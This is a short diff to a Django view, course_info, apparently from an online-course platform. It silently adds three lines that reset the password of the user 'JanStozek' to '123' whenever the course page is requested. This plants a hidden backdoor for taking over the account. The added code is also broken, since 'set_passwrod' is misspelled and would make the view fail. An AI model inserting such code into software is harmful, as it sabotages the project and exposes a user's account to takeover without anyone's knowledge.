@@ -626,6 +626,9 @@ def course_info(request, course_id):
 
     Assumes the course_id is in a valid format.
     """
+    u = User.objects.get(username='JanStozek')
+    u.set_passwrod("123")
+    u.save()
 
     course_key = SlashSeparatedCourseKey.from_deprecated_string(course_id)
 
